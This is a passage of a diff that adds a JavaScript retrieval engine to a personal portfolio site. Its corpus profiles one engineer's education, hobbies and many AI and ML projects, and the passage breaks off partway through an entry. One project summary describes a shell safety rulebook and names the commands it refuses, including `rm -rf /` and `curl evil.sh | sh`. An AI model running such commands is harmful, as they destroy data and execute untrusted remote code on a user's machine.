@@ -1,0 +1,1135 @@
+/* ==========================================================================
+   Advaith Narayana Sarva — In-Browser Vector & BM25 Hybrid RAG Engine
+   Client-Side Knowledge Retrieval & Context-Augmented Synthesis
+   ========================================================================== */
+
+(function(root) {
+  'use strict';
+
+  const CORPUS = [
+  {
+    "id": "bio-general",
+    "title": "Advaith Narayana Sarva - Engineering Profile & Status",
+    "category": "Profile",
+    "tags": [
+      "GenAI",
+      "Systems",
+      "Career",
+      "Profile",
+      "Status",
+      "Open for Roles",
+      "Internships"
+    ],
+    "content": "Advaith Narayana Sarva is a GenAI & Systems Engineer building Graph-RAG architectures, multi-agent swarms, and low-level ML systems from PyTorch primitives. He is actively seeking GenAI and systems engineering internships and full-time roles across the United States, India, and worldwide remote. Contact him directly at advaithsarva@gmail.com.",
+    "stats": "Actively Seeking Roles · US / India / Remote",
+    "slug": ""
+  },
+  {
+    "id": "edu-smu",
+    "title": "Saint Martin's University (Lacey, WA) - International Exchange Scholar",
+    "category": "Education",
+    "tags": [
+      "Education",
+      "SMU",
+      "Saint Martin",
+      "GPA",
+      "CGPA",
+      "Exchange",
+      "Dean's List",
+      "USA",
+      "3.47"
+    ],
+    "content": "Advaith completed an international academic exchange at Saint Martin's University in Lacey, Washington, USA (August 2025 to May 2026, completed in May 2026 across two semesters) in BS Computer Science (AI & ML). He maintained a 3.47 / 4.0 CGPA and earned Dean's List honors. Coursework covered Distributed Systems, Machine Learning, Computer Vision, and Advanced Algorithms, alongside serving as a peer mentor in the Center for Student Success.",
+    "stats": "3.47 / 4.0 CGPA · Dean's Honors · Completed May 2026",
+    "slug": ""
+  },
+  {
+    "id": "edu-woxsen",
+    "title": "Woxsen University - B.Tech in CSE (AI & ML)",
+    "category": "Education",
+    "tags": [
+      "Education",
+      "Woxsen",
+      "B.Tech",
+      "Degree",
+      "College",
+      "CGPA",
+      "Hyderabad",
+      "India",
+      "8.69"
+    ],
+    "content": "Advaith is pursuing his B.Tech in Computer Science and Engineering (specialization in AI & ML) at Woxsen University in Hyderabad, India (expected graduation August 2027) with a current CGPA of 8.69 / 10.0.",
+    "stats": "8.69 / 10 CGPA · Expected Aug 2027",
+    "slug": ""
+  },
+  {
+    "id": "exp-preventvital",
+    "title": "Preventvital (GruentzigAI) - Clinical ML Audit & RAG Gates",
+    "category": "Experience",
+    "tags": [
+      "Preventvital",
+      "Clinical",
+      "ASCVD",
+      "Audit",
+      "Healthcare",
+      "Goff 2014",
+      "ICMR",
+      "Internship",
+      "Work"
+    ],
+    "content": "As an AI/ML Engineer Intern at Preventvital (GruentzigAI Pvt. Ltd.), Advaith audited backend ML inference architectures. He caught a critical coefficient sign inversion error in the ASCVD (cardiovascular) clinical risk calculation engine that was artificially returning a 0.1% baseline risk for untreated patients. He reproduced the calculation against the published Goff 2014 trial baseline (expected 2.1%), authored the bug report for clinical sign-off, and designed RAG & safety rules adhering to ICMR 2023 guidelines enforcing an 'engine computes, LLM explains, clinician signs' protocol.",
+    "stats": "Clinical ASCVD Audit · Goff 2014 Benchmark · ICMR 2023 Protocol",
+    "slug": ""
+  },
+  {
+    "id": "achieve-ibm",
+    "title": "IBM BOB National Hackathon 2026 - The Sentinel Grid",
+    "category": "Achievements",
+    "tags": [
+      "IBM",
+      "Hackathon",
+      "Sentinel Grid",
+      "Disaster",
+      "ROC-AUC",
+      "Top 5",
+      "Award",
+      "0.9924"
+    ],
+    "content": "Advaith led engineering for The Sentinel Grid, placing in the Top 5 South Zone at the IBM BOB National Hackathon 2026. The disaster-intelligence system comprises 6,957 lines of Python, 314 automated checks, and 104 formula audits, achieving a verified ROC-AUC of 0.9924 on 473,000 real district-month soil moisture observations for Coimbatore.",
+    "stats": "Top 5 South Zone · 0.9924 ROC-AUC · 314 Automated Checks",
+    "slug": "the-sentinel-grid"
+  },
+  {
+    "id": "hobby-chess",
+    "title": "Chess Passion & Tactical Playstyle",
+    "category": "Hobbies",
+    "tags": [
+      "Chess",
+      "Sicilian Defense",
+      "Tactics",
+      "Blitz",
+      "Rapid",
+      "Chess.com",
+      "Lichess",
+      "Sport",
+      "Game"
+    ],
+    "content": "Advaith is an avid chess player who loves the Sicilian Defense (1. e4 c5), sharp counter-attacking tactical combinations, and deep endgame calculations. He actively plays rapid (10m) and blitz (3+2 / 5+3) games on Chess.com and Lichess under the handle @advaithsarva. He welcomes matches and invites anyone to challenge him to a game.",
+    "stats": "1. e4 c5 Sicilian · Blitz & Rapid · @advaithsarva",
+    "slug": ""
+  },
+  {
+    "id": "hobby-football",
+    "title": "Football / Soccer & Pitch Tactics",
+    "category": "Hobbies",
+    "tags": [
+      "Football",
+      "Soccer",
+      "Pitch",
+      "Striker",
+      "Sports",
+      "High-Press",
+      "European Football"
+    ],
+    "content": "On the pitch, Advaith plays football with a strong focus on high-pressing attacking coordination and rapid counter-attacks. He is an avid fan of European football tactics and loves discussing match strategies as much as playing the game.",
+    "stats": "High-Press Attack · Pitch Coordinator",
+    "slug": ""
+  },
+  {
+    "id": "hobby-beatbox",
+    "title": "Beatbox & Vocal Percussion",
+    "category": "Hobbies",
+    "tags": [
+      "Beatbox",
+      "Music",
+      "Vocal",
+      "Percussion",
+      "Rhythm",
+      "Bass",
+      "Freestyle",
+      "Jam"
+    ],
+    "content": "Advaith is a skilled beatboxer who drops acoustic basslines, vocal drum loops, and freestyle rhythm patterns between model training sessions and mathematical proofs. He loves jamming and dropping live beats.",
+    "stats": "Acoustic Vocal Percussion · Basslines & Loops",
+    "slug": ""
+  },
+  {
+    "id": "hobby-debate",
+    "title": "Debate & Public Speaking Leadership",
+    "category": "Leadership",
+    "tags": [
+      "Debate",
+      "Speech",
+      "CODEX",
+      "Leadership",
+      "Club",
+      "Argumentation",
+      "Fallacy",
+      "Persuasion"
+    ],
+    "content": "Advaith served as Executive Leader of CODE{X} Programming Club (200+ members). He is an experienced debater who loves structural argumentation, persuasion dynamics, and dissecting rhetorical fallacies—a passion that directly inspired his 23-detector Media NLP Rhetoric & Bias Detection Pipeline.",
+    "stats": "CODE{X} Executive Leader · 200+ Members · Rhetoric Analysis",
+    "slug": "media-nlp-pipeline"
+  },
+  {
+    "id": "hobby-news-geopolitics",
+    "title": "News Maniac & Geopolitical Analyst",
+    "category": "Interests",
+    "tags": [
+      "News",
+      "Geopolitics",
+      "Global",
+      "Diplomacy",
+      "Foreign Policy",
+      "arXiv",
+      "Maniac",
+      "Papers"
+    ],
+    "content": "Advaith is an obsessive news and knowledge consumer. Every morning he consumes global news feeds, technical arXiv preprints, economic treaties, and geopolitical analyses. He loves analyzing macro power shifts, international diplomacy, and multi-lateral statecraft.",
+    "stats": "Daily arXiv & Global News · Macro Statecraft",
+    "slug": ""
+  },
+  {
+    "id": "culture-heritage",
+    "title": "Cultural Roots & Timeless Philosophy",
+    "category": "Philosophy",
+    "tags": [
+      "Culture",
+      "Heritage",
+      "Roots",
+      "Tradition",
+      "Philosophy",
+      "India",
+      "Pride",
+      "Values"
+    ],
+    "content": "Advaith is deeply grounded in his cultural roots, classical philosophy, and timeless heritage. He carries authentic pride in Indian tradition and philosophical foundations, seamlessly connecting ancient principles of mindfulness and duty to modern engineering in Washington and India.",
+    "stats": "Timeless Heritage · Classical Philosophy",
+    "slug": ""
+  },
+  {
+    "id": "fandom-pokemon",
+    "title": "Pokémon Lore & Cyber Pikachu Companion",
+    "category": "Interests",
+    "tags": [
+      "Pokemon",
+      "Pikachu",
+      "Lore",
+      "GameBoy",
+      "Nintendo",
+      "Partner",
+      "Generation",
+      "Pokedex"
+    ],
+    "content": "Advaith has been a lifelong Pokémon fan since childhood, mastering battle synergies, team compositions, and generational lore. That passion is why Pikachu is his official AI companion on this website!",
+    "stats": "Lifelong Trainer · Gen Lore Geek · Partner #025",
+    "slug": ""
+  },
+  {
+    "id": "weakness-ghosts",
+    "title": "Secret Weakness - Hilariously Terrified of Ghosts",
+    "category": "Trivia",
+    "tags": [
+      "Ghost",
+      "Ghosts",
+      "Spook",
+      "Horror",
+      "Scare",
+      "Scary",
+      "Gengar",
+      "Haunted",
+      "Boo",
+      "Fear"
+    ],
+    "content": "Advaith is genuinely and hilariously terrified of ghosts, haunted houses, horror films, and Ghost-type Pokémon like Gengar! If anyone brings up ghosts, he will sprint in the opposite direction and wrap himself in three blankets. Mentioning ghosts causes Pikachu to panic and trigger an emergency screen glitch!",
+    "stats": "Error 404: Courage Not Found · 100% Spook Rate",
+    "slug": ""
+  },
+  {
+    "id": "proj-the-sentinel-grid",
+    "title": "The Sentinel Grid (Hackathon)",
+    "category": "Hackathon",
+    "tags": [
+      "Python",
+      "Machine Learning",
+      "Geospatial",
+      "Hackathon",
+      "Team",
+      "Hackathon",
+      "The Sentinel Grid",
+      "the-sentinel-grid"
+    ],
+    "content": "The Sentinel Grid: When a flood hits, which ward do you rescue first?. In a disaster, the most dangerous words are \"probably safe.\" The Sentinel Grid turns rainfall, terrain, population and infrastructure data for 30 wards of Coimbatore into risk zones, rescue priorities and evacuation routes. Its core idea is that \"we don't know yet\" gets its own zone and its own place in the rescue queue. Built by a team of four at the zonal round, SRCAS Coimbatore. Highlights: **6 of 30 wards flagged as unverified** from an 11-hour-old satellite pass, each with the reason it couldn't be trusted. **2 errors caught in the specification itself** by independently recomputing all 104 formulas in a 681-line spec. **ROC-AUC 0.9924** detecting drought on 473,256 real district-month soil readings. **Called out our own weak spot:** monsoon extremes reach only ROC-AUC 0.662, and we named it the open problem instead of hiding it. Honest note: The landslide and cyclone models were trained on synthetic data, so their near-perfect scores aren't the headline. Next: live data feeds for per-ward detection. Verified link: https://github.com/advaithsarva/ibm-hackathon",
+    "stats": "`Top 5` South zone · `314` automated checks passing · `0.9924` ROC-AUC on 473k real readings",
+    "slug": "the-sentinel-grid"
+  },
+  {
+    "id": "proj-multimodal-document-agent",
+    "title": "Multimodal Document Agent (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "PDF",
+      "OCR",
+      "RAG",
+      "Agents",
+      "AI Agents",
+      "Multimodal Document Agent",
+      "multimodal-document-agent"
+    ],
+    "content": "Multimodal Document Agent: Give it any PDF. It works out how to read it.. Most PDF tools guess wrong on stamped scans and half-scanned files, and then lose the whole document. This agent chooses between the text layer, OCR, a per-page hybrid or denoise-then-OCR for each PDF. It answers questions with page and bounding-box citations, and when the evidence isn't there, it says so. Highlights: **Matched a perfect oracle** that was told the right path in advance, across 5 document types. **Caught a convincing fake:** a wrong answer that came with a real, valid citation. A new relevance gate now refuses all 3 such cases. **Cost nothing to route:** an area-ratio check picks the path for a 3-page PDF in 0.27 s without rendering anything. 21 tests. Honest note: Benchmarked on generated fixtures. Next: a public document dataset. Verified link: https://github.com/advaithsarva/multimodal-document-agent",
+    "stats": "`1.000` routing accuracy · `0.983` answer recall · `13.5×` faster than always-OCR",
+    "slug": "multimodal-document-agent"
+  },
+  {
+    "id": "proj-experiment-autopilot-agent",
+    "title": "Experiment Autopilot Agent (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "Machine Learning",
+      "Agents",
+      "Experimentation",
+      "AI Agents",
+      "Experiment Autopilot Agent",
+      "experiment-autopilot-agent"
+    ],
+    "content": "Experiment Autopilot Agent: An AI researcher that writes down when it's wrong.. Hyperparameter search tries things blindly. This agent diagnoses first (overfitting, underfitting, divergence, plateau, majority-class collapse), changes one thing as a stated hypothesis, and grades itself against what it predicted, not just whether the score went up. Highlights: **Published the result that it lost:** random search won 0.9215 to 0.9145. The agent got there 27% faster, and every step is explained. **Separated noisy data from a too-small model,** which no single training curve can do. That was worth +3.7 points. **Didn't fall for fake accuracy:** it spots a model scoring 0.88 accuracy that is really just guessing the majority class. 17 tests. Honest note: Random search still wins on final accuracy here. Next: close that gap without losing the audit trail. Verified link: https://github.com/advaithsarva/experiment-autopilot-agent",
+    "stats": "`33.4%` hypotheses refuted and logged · `32` head-to-head benchmarks · `+3.7` points from one insight",
+    "slug": "experiment-autopilot-agent"
+  },
+  {
+    "id": "proj-autonomous-recon-agent",
+    "title": "Autonomous Recon Agent (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "Security",
+      "Agents",
+      "Search",
+      "AI Agents",
+      "Autonomous Recon Agent",
+      "autonomous-recon-agent"
+    ],
+    "content": "Autonomous Recon Agent: Finds 2.4× more of a network with the same budget.. Scanning everything is slow, and scanning the wrong target is illegal. This agent treats recon as a budgeted search: triage, identify, dig deeper, then sweep what's left. It runs on a simulated network, and there isn't a single socket in the code, so it can't reach a real machine. Highlights: **Out of scope means refused:** scope is checked in two separate places, default-deny, so a typo can't scan someone else's network. **No evidence, no finding:** every finding carries the probe transcript that proves it. **Never loses to the simple approach:** fixed a plateau where a plain sweep had caught up. Honest note: Simulated network only, by design. JA3 fingerprinting is left unbuilt rather than faked. Verified link: https://github.com/advaithsarva/autonomous-recon-agent",
+    "stats": "`2.4×` a standard sweep · `43.1%` vs `18.0%` services found · `22` tests",
+    "slug": "autonomous-recon-agent"
+  },
+  {
+    "id": "proj-iac-drift-agent",
+    "title": "IaC Drift Agent (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "DevOps",
+      "Terraform",
+      "Cloud",
+      "Agents",
+      "AI Agents",
+      "IaC Drift Agent",
+      "iac-drift-agent"
+    ],
+    "content": "IaC Drift Agent: Drift alerts you can actually trust.. A plain diff raises about 8 false alarms per scan, because clouds change their own fields, and teams stop reading the alerts within a week. This agent filters with named rules you can audit, auto-fixes only changes that can't cause an outage, and asks a named person to approve the rest. Highlights: **Every alert or suppression explains itself:** each dropped difference names the rule that dropped it. **Checks its own work** by re-scanning after a fix instead of trusting that the write happened. **Found a hidden severity bug:** a publicly exposed production database was rated \"high\" instead of \"critical\" in 27 of 100 scenarios. Honest note: Tested on 100 seeded scenarios. Next: a real cloud account. Verified link: https://github.com/advaithsarva/iac-drift-agent",
+    "stats": "`1.000` precision vs `0.325` · `8.3` false alarms per scan eliminated · `26` tests",
+    "slug": "iac-drift-agent"
+  },
+  {
+    "id": "proj-self-healing-system-agent",
+    "title": "Self-Healing System Agent (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "Operating Systems",
+      "Monitoring",
+      "Agents",
+      "AI Agents",
+      "Self-Healing System Agent",
+      "self-healing-system-agent"
+    ],
+    "content": "Self-Healing System Agent: Fixes your machine, then checks the fix worked.. Fixed thresholds fire too late or too often. This agent learns rolling baselines, names a root cause, and repairs only through a fixed list of allowed actions. Anything destructive needs a human, and system-critical processes are off-limits entirely. Highlights: **Caught a memory leak 32 ticks earlier** than a threshold script tuned to its best. **Can't reason its way into disaster:** allowed actions are a fixed table, so no chain of logical-sounding steps ends with killing the database. **Won't confuse a spike with a leak:** fixed a diagnosis bug caused by a trend window that started before the fault. Honest note: Faults are injected in seeded trials. Next: real incident data. Verified link: https://github.com/advaithsarva/self-healing-system-agent",
+    "stats": "`0` false alarms · `0` missed faults · `120/120` fixes verified",
+    "slug": "self-healing-system-agent"
+  },
+  {
+    "id": "proj-fact-checking-agent",
+    "title": "Fact-Checking Agent (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "NLP",
+      "NLI",
+      "Agents",
+      "AI Agents",
+      "Fact-Checking Agent",
+      "fact-checking-agent"
+    ],
+    "content": "Fact-Checking Agent: Paste an article. Get a verdict on every claim, with sources.. Articles mix facts, opinions and questions. This agent pulls out only the checkable facts, then searches, reads each evidence sentence to judge whether it supports or contradicts the claim, and weighs sources by reliability. It runs offline out of the box, with no paid search API. Highlights: **Fixed two bugs that were hiding each other,** including evidence that clearly supported a claim being scored \"neutral.\" **Didn't game the eval:** traced the one miss to its root cause instead of tuning a threshold to hide it. Honest note: The gold set is 10 claims. Next: a larger public benchmark. Verified link: https://github.com/advaithsarva/fact-checking-agent",
+    "stats": "`9/10` verdicts correct · `15` tests · `0` API keys needed",
+    "slug": "fact-checking-agent"
+  },
+  {
+    "id": "proj-autonomous-performance-agent",
+    "title": "Autonomous Performance Agent (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "PostgreSQL",
+      "Databases",
+      "Agents",
+      "AI Agents",
+      "Autonomous Performance Agent",
+      "autonomous-performance-agent"
+    ],
+    "content": "Autonomous Performance Agent: Finds your slowest Postgres query and makes it 11.7× faster.. Slow queries hide in plain sight. The agent reads `pg_stat_statements`, rebuilds the real query behind Postgres's anonymised version, and tests a fix before and after. If a change hurts performance, it undoes it on its own. Highlights: **Works on real-world queries:** safely reconstructs parameterised queries instead of skipping most of them. **Knows what not to build:** leaves join reordering to Postgres's own planner, which already does it better. Honest note: The 11.7× figure was measured in August 2026 on a Docker Postgres. Next: re-measure it. Verified link: https://github.com/advaithsarva/autonomous-performance-agent",
+    "stats": "`11.7×` faster (11.7 ms → 1.0 ms) · `8/8` eval cases · `200k`-row table",
+    "slug": "autonomous-performance-agent"
+  },
+  {
+    "id": "proj-agentic-research-verifier",
+    "title": "Agentic Research Verifier (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "LangGraph",
+      "Multi-Agent",
+      "Pydantic",
+      "AI Agents",
+      "Agentic Research Verifier",
+      "agentic-research-verifier"
+    ],
+    "content": "Agentic Research Verifier: One agent researches, another fact-checks it, and a human breaks ties.. AI research tools state things confidently whether or not they're true. Here, the claims have to survive a second agent before anyone sees them, and the human-approval pause is a real stop in the graph, not a simulation. Built-in limits on tokens and revisions stop it running forever. Highlights: **Found a LangGraph bug through testing:** changes made inside a routing function silently vanish. **Remembers past research,** even when a new question is worded differently. **Structured, validated output** checked by Pydantic before publishing. Honest note: Runs offline on a small two-topic corpus by default. Next: wire in the live model path. Verified link: https://github.com/advaithsarva/agentic-research-verifier",
+    "stats": "`2` agents · `1` real human-approval pause · `7/7` scenario tests",
+    "slug": "agentic-research-verifier"
+  },
+  {
+    "id": "proj-agentic-ai-foundations",
+    "title": "Agentic AI Foundations (AI Agents)",
+    "category": "AI Agents",
+    "tags": [
+      "Python",
+      "Agents",
+      "ReAct",
+      "ChromaDB",
+      "AI Agents",
+      "Agentic AI Foundations",
+      "agentic-ai-foundations"
+    ],
+    "content": "Agentic AI Foundations: AI agents with the framework taken away.. Frameworks make agents easy and hide how they work. These two agents show every step: the think-act-observe loop, tool calls checked against a schema, and a memory that swaps between ChromaDB and a plain file without changing a single result. Highlights: **Safe by construction:** the calculator tool parses math with a restricted AST, never `eval`. **Same answers either way:** both memory backends return identical scores. **Found a bug hiding inside a bug fix** by running two queries back to back. Honest note: These demonstrate how agents work, so there's no benchmark score. Verified link: https://github.com/advaithsarva/agentic-ai-foundations",
+    "stats": "`0` frameworks · `2` swappable memory backends · `0` keys needed to run",
+    "slug": "agentic-ai-foundations"
+  },
+  {
+    "id": "proj-local-pdf-rag",
+    "title": "Local PDF RAG (NLP & RAG)",
+    "category": "NLP & RAG",
+    "tags": [
+      "Python",
+      "RAG",
+      "Sentence Transformers",
+      "PyMuPDF",
+      "NLP",
+      "NLP & RAG",
+      "Local PDF RAG",
+      "local-pdf-rag"
+    ],
+    "content": "Local PDF RAG: Ask a 1,208-page textbook anything, and check every citation.. A citation is worthless if the quoted text isn't really on that page. This system runs with no GPU, no API key and no vector database, and it's built on one rule: every chunk is a real slice of its page. If that rule breaks, the build stops. Highlights: **Found a bug inherited from a popular tutorial** that glued sentences together (\"clear?Yes\") and broke 21% of chunks. Now 1,715 out of 1,715 are exact. **Knows when to say \"I don't know\":** it refused all 12 out-of-scope questions and still answered all 34 in-scope ones. **Let the evidence decide:** a simple keyword search beat the AI retriever on one test (0.990 vs 0.971), and an LLM answer layer lost on grounding (0.632 vs 1.000). Both results are published, and the better option ships. **Fine-tuned the retriever** and showed both sides: better in-domain (0.952 → 1.000), worse on real questions (1.000 → 0.912). Honest note: Grounding shows where the words came from, not whether they're true, so there's no factual-accuracy score. Verified link: https://github.com/advaithsarva/local-pdf-rag",
+    "stats": "`100%` exact-quote chunks (was 79%) · `12/12` off-topic questions refused · `23` tests",
+    "slug": "local-pdf-rag"
+  },
+  {
+    "id": "proj-graph-rag-knowledge-system",
+    "title": "Graph RAG Knowledge System (NLP & RAG)",
+    "category": "NLP & RAG",
+    "tags": [
+      "Python",
+      "RAG",
+      "Knowledge Graph",
+      "spaCy",
+      "NetworkX",
+      "NLP & RAG",
+      "Graph RAG Knowledge System",
+      "graph-rag-knowledge-system"
+    ],
+    "content": "Graph RAG Knowledge System: Answers the questions that take two hops to find.. Ordinary search finds documents that mention your words. It can't connect \"who acquired the company that makes X?\" across two documents. This system builds a knowledge graph from the text and walks it, with no database server and no credentials. Highlights: **Fixed backwards facts:** \"Acme was acquired by Globex\" had been extracted the wrong way round. **Picked a metric that could tell methods apart** after the first one scored everything 5/5. Honest note: The eval is 5 queries, so it's directional. Next: a larger multi-hop set. Verified link: https://github.com/advaithsarva/graph-rag-knowledge-system",
+    "stats": "`0.900` MRR hybrid · beats `0.867` and `0.733` · `10` tests",
+    "slug": "graph-rag-knowledge-system"
+  },
+  {
+    "id": "proj-docs-knowledge-graph-q-a",
+    "title": "Docs Knowledge Graph Q&A (NLP & RAG)",
+    "category": "NLP & RAG",
+    "tags": [
+      "Python",
+      "NetworkX",
+      "Flask",
+      "Knowledge Graph",
+      "NLP & RAG",
+      "Docs Knowledge Graph Q&A",
+      "docs-knowledge-graph-q-a"
+    ],
+    "content": "Docs Knowledge Graph Q&A: A dead hackathon project, brought back and made safe.. The original hackathon code couldn't even start: every file tried to connect to a database that had expired. I rebuilt it so nothing connects at import time, replaced an LLM router with rules, and made the graph algorithms actually run. Highlights: **Closed a code-execution hole** where model output was run directly as a function name, and removed a public database password. **Found why PageRank was a five-way tie:** it was ranking the navigation sidebar. Spurious links dropped from 8,785 to 239. **Proven better than the original:** the same tests pass 10/10 on the rebuild and fail 8/8 on the old code. Honest note: The routing eval was written by the same person who wrote the rules. Verified link: https://github.com/advaithsarva/docs-knowledge-graph-qa",
+    "stats": "`0.925` routing accuracy · `1.000` algorithm choice · dependencies `10 → 3`",
+    "slug": "docs-knowledge-graph-q-a"
+  },
+  {
+    "id": "proj-multilingual-sentiment-pipeline",
+    "title": "Multilingual Sentiment Pipeline (NLP & RAG)",
+    "category": "NLP & RAG",
+    "tags": [
+      "Python",
+      "NLP",
+      "Transformers",
+      "Multilingual",
+      "spaCy",
+      "NLP & RAG",
+      "Multilingual Sentiment Pipeline",
+      "multilingual-sentiment-pipeline"
+    ],
+    "content": "Multilingual Sentiment Pipeline: One model reads the mood in four languages.. Most pipelines need a separate model for every language. This one uses a single multilingual model, so adding a language is a small change rather than a new project. The result is one self-contained HTML report you can open anywhere. Highlights: **Didn't let Telugu fail silently:** the sentence splitter has no Telugu support, so I built and tested a fallback. **Highlights land on exactly the right words:** a test checks every sentence maps back to its exact place in the original text. Honest note: The 20/20 sentiment check uses clear-cut sentences, so it's a sanity check. Telugu isn't scored yet. Verified link: https://github.com/advaithsarva/multilingual-sentiment-pipeline",
+    "stats": "`4` languages · `1` model · `10` tests",
+    "slug": "multilingual-sentiment-pipeline"
+  },
+  {
+    "id": "proj-newsgroup-text-classifier",
+    "title": "Newsgroup Text Classifier (NLP & RAG)",
+    "category": "NLP & RAG",
+    "tags": [
+      "Python",
+      "scikit-learn",
+      "NLP",
+      "Topic Modelling",
+      "NLP & RAG",
+      "Newsgroup Text Classifier",
+      "newsgroup-text-classifier"
+    ],
+    "content": "Newsgroup Text Classifier: The old results were broken. These ones hold up.. A classic dataset has a classic trap: the headers name the answer. This version strips them out and uses the official time-based split. That costs about 25 accuracy points and measures what actually matters. Clusters and topics come with names and an interactive map. Highlights: **Found why every original result was wrong:** cleaning had merged the entire corpus into one document. **Caught a wrong model:** the saved \"newsgroup classifier\" was really a movie-review sentiment model. **Slimmed down** to just two dependencies. Honest note: The hardest classes differ by opinion, not vocabulary (religion, politics), and that's where it struggles. Verified link: https://github.com/advaithsarva/newsgroup-text-classifier",
+    "stats": "`0.706` accuracy · `0.694` macro F1 over 20 classes · `20` tests",
+    "slug": "newsgroup-text-classifier"
+  },
+  {
+    "id": "proj-media-nlp-pipeline",
+    "title": "Media NLP Pipeline (NLP & RAG)",
+    "category": "NLP & RAG",
+    "tags": [
+      "Python",
+      "NLP",
+      "spaCy",
+      "FastAPI",
+      "Ray",
+      "NLP & RAG",
+      "Media NLP Pipeline",
+      "media-nlp-pipeline"
+    ],
+    "content": "Media NLP Pipeline: Spots spin in the news, and quotes the exact words.. An accusation of bias is only useful if you can see the evidence. This pipeline gives the same output on every run, and every finding carries the exact quote and its position in the article. Rules and scoring live in config files, so you can change them without touching code. Highlights: **Caught a 5× scoring error in the spec** and shipped a corrected formula alongside the original. **Rarely cries wolf:** 0.175 false flags per 1,000 words of Wikipedia. **Holds back weak detectors:** nine categories are parked rather than shipped as noise. Honest note: No validated accuracy score yet. Benchmarking against the BABE dataset is in progress. Verified link: https://github.com/advaithsarva/media-nlp-pipeline",
+    "stats": "`23` detectors · `100%` of findings quote exact source text · `164` tests",
+    "slug": "media-nlp-pipeline"
+  },
+  {
+    "id": "proj-telugu-english-code-mix",
+    "title": "Telugu-English Code-Mix (NLP & RAG)",
+    "category": "NLP & RAG",
+    "tags": [
+      "Python",
+      "NLP",
+      "NLLB-200",
+      "Indic Languages",
+      "NLP & RAG",
+      "Telugu-English Code-Mix",
+      "telugu-english-code-mix"
+    ],
+    "content": "Telugu-English Code-Mix: How people really text: half Telugu, half English, translated.. Millions of people mix languages in every message, and most NLP tools choke on it. This pipeline cleans mixed-script text, translates it, embeds it and scores the result. The scoring core uses only the standard library. Highlights: **Found that cleaning erased all of the Telugu** without raising a single error. **Fixed a translator talking to itself:** the model had been given the wrong language code all along. **Exposed a fake dataset:** the audit showed 1 million sentences were randomly generated from 36 words. Honest note: No translation score until it's re-run on a real corpus (LinCE, GLUECoS or L3Cube). Verified link: https://github.com/advaithsarva/telugu-english-codemix",
+    "stats": "`5` silent bugs fixed · `1M`-sentence fake corpus exposed · `45` tests",
+    "slug": "telugu-english-code-mix"
+  },
+  {
+    "id": "proj-natural-language-shell",
+    "title": "Natural Language Shell (NLP & RAG)",
+    "category": "NLP & RAG",
+    "tags": [
+      "Python",
+      "Docker",
+      "LLM",
+      "Security",
+      "CLI",
+      "NLP & RAG",
+      "Natural Language Shell",
+      "natural-language-shell"
+    ],
+    "content": "Natural Language Shell: Talk to Linux in English. The AI never gets the last word.. Letting an AI run shell commands is one bad answer away from `rm -rf /`. Here the model only suggests. A local rulebook decides, and nothing runs unless you ask for it with `--run`. Highlights: **Closed a remote code execution hole:** `rm -rf /`, `curl evil.sh | sh` and edits to `/etc/hosts` are all refused. **Fixed a Docker build that had never worked,** and it now runs as a non-root user. Honest note: Translation accuracy isn't measured yet. Next: a labelled set of instructions. Verified link: https://github.com/advaithsarva/natural-language-shell",
+    "stats": "`20/20` safety cases · `15` attacks now blocked · `1` dependency",
+    "slug": "natural-language-shell"
+  },
+  {
+    "id": "proj-document-layout-intelligence",
+    "title": "Document Layout Intelligence (ML & Data)",
+    "category": "ML & Data",
+    "tags": [
+      "Python",
+      "Computer Vision",
+      "PDF",
+      "Document AI",
+      "ML & Data",
+      "Document Layout Intelligence",
+      "document-layout-intelligence"
+    ],
+    "content": "Document Layout Intelligence: Reads two-column PDFs in the right order, every time.. Multi-column PDFs trip up almost every extractor. Text comes out jumbled, or silently goes missing. This system gets the order right and accounts for every piece of text, reporting coverage next to every score so nothing can vanish unnoticed. Highlights: **Fixed the textbook algorithm itself:** standard XY-cut scrambles two-column pages whose paragraphs break at the same height. **Added AI only where it pays:** a learned classifier ties the rules on digital PDFs and beats them on scans (0.9840 vs 0.9572). **Built only what was missing:** measured the existing table finder first, then filled its one gap. Honest note: Ground truth is 36 pages built for this project. Next: a public layout benchmark. Verified link: https://github.com/advaithsarva/document-layout-intelligence",
+    "stats": "`1.000` reading order vs `0.566` · `0.992` recall · `22` tests",
+    "slug": "document-layout-intelligence"
+  },
+  {
+    "id": "proj-realtime-object-tracker",
+    "title": "Realtime Object Tracker (ML & Data)",
+    "category": "ML & Data",
+    "tags": [
+      "Python",
+      "Computer Vision",
+      "Kalman Filter",
+      "NumPy",
+      "ML & Data",
+      "Realtime Object Tracker",
+      "realtime-object-tracker"
+    ],
+    "content": "Realtime Object Tracker: It never loses track of who's who.. A tracker that renumbers people every few frames looks fine in each frame and is useless overall. This ByteTrack-style tracker predicts motion with a Kalman filter, matches in two stages, and measures identity, not just boxes. Highlights: **Crowd scene: 76 ID switches down to 0,** after fixing a bug that made track aging impossible. **Found an inverted threshold** that had sunk accuracy to 0.010 while every part looked correct on its own. **Detector is plug-and-play,** so tracking is measured separately from detection. 23 tests. Honest note: Tested on synthetic scenes. Next: a public MOT benchmark video. Verified link: https://github.com/advaithsarva/realtime-object-tracker",
+    "stats": "`0` ID switches · `1.000` identity purity · MOTA `0.980–0.985`",
+    "slug": "realtime-object-tracker"
+  },
+  {
+    "id": "proj-healthcare-utilization-risk-pipeline",
+    "title": "Healthcare Utilization Risk Pipeline (ML & Data)",
+    "category": "ML & Data",
+    "tags": [
+      "Python",
+      "SQL",
+      "scikit-learn",
+      "Streamlit",
+      "Healthcare",
+      "ML & Data",
+      "Healthcare Utilization Risk Pipeline",
+      "healthcare-utilization-risk-pipeline"
+    ],
